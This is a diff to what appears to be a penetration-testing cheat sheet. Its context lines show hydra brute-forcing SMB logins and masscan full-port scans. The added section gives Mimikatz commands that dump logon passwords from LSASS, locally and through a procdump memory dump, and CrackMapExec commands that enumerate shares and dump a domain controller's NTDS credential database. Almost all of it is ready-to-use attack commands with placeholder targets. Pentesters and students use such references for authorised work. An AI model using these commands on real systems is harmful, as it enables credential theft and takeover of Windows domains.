@@ -214,3 +214,39 @@ hydra -L <usernames.txt> -P <passwords.txt> -o hydra-out.txt -u smb://<IP>
 masscan -p1-65535,U:1-65535 --open --banners -oB massscan-all-tcp-udp <IP>
 masscan --readscan massscan-all-tcp-udp
 ```
+
+# Mimikatz
+
+Dumping hashes locally:
+```
+privilege::debug
+log
+sekurlsa::logonpasswords
+```
+
+Dumping hashes remotely:
+```
+TARGET > procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
+
+LOCAL MIMIKATZ >
+log 
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
+```
+
+# Crackmapexec
+
+Installation:
+```
+apt-get install crackmapexec
+```
+
+Find shares:
+```
+crackmapexec smb -d <domain> -u <user> -p <password> --shares
+```
+
+Dump NTDS:
+```
+crackmapexec smb -d <domain> -u <user> -p <password> <Domain Controller IP> --ntds drsuapi
+```
